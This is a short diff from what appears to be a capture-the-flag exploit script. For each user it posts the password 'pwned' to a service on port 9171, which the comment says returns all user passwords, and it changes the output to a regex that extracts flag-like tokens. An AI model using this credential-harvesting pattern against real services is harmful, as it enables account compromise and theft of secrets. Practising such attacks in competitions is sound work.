@@ -22,4 +22,4 @@ for user in users:
 
     # send this password for checking and get all user passwords
     r = sess.post(f'http://{ip}:9171/users/{user}/', data={'password': 'pwned'})
-    print(r.text, flush=True)
+    print(re.findall('[A-Z0-9]{31}=', r.text), flush=True)
